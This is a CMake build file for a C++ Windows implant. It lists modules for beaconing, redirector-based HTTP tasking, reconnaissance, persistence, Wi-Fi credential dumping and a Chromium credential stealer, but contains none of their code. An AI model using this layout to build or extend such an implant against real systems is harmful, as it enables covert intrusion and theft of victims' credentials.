cmake_minimum_required(VERSION 3.20)
project(windows-implant LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

include(cmake/CompileOptions.cmake)

add_executable(main
    src/main.cpp
    src/core/ImplantId.cpp
    src/crypto/AesGcm.cpp
    src/crypto/Base64.cpp
    src/http/WinHttpClient.cpp
    src/http/RedirectorResolver.cpp
    src/beacon/Beacon.cpp
    src/beacon/TaskDispatcher.cpp
    src/recon/WmiHelpers.cpp
    src/recon/SysInfo.cpp
    src/recon/InstalledSoftware.cpp
    src/persistence/Persistence.cpp
    src/wifi/WifiDumper.cpp
    src/utils/Exec.cpp
    src/credential/ChromiumStealer.cpp
    # Expecting user to provide sqlite3.c in external/sqlite/
    # external/sqlite/sqlite3.c 
)

target_include_directories(main PUBLIC external external/sqlite)
target_link_libraries(main bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi)
